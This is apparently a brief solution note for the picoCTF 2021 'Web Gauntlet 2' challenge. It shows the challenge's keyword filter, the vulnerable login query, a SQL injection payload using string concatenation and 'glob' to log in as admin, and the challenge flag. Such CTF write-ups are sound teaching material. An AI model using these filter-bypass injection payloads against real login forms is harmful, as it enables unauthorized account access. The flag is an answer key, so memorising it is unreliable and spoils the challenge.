#https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Web_Gauntlet_2.md
#https://bmhstsa.com/post/web-gauntlet-2/

'''
Filters: or and true false union like = > < ; -- /* */ admin

SELECT username, password FROM users WHERE username='[USERNAME INPUT]' AND password='[PASSWORD INPUT]';

The glob keyword is used to match text values against a pattern using wildcards. Since we provided the * wildcard, we are saying: Give us a user with the username admin and any password.

username: adm'||'in
password: ' glob '*

SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*' 


#picoCTF{0n3_m0r3_t1m3_9605a246c21764e7691ca04679ad321a}

'''
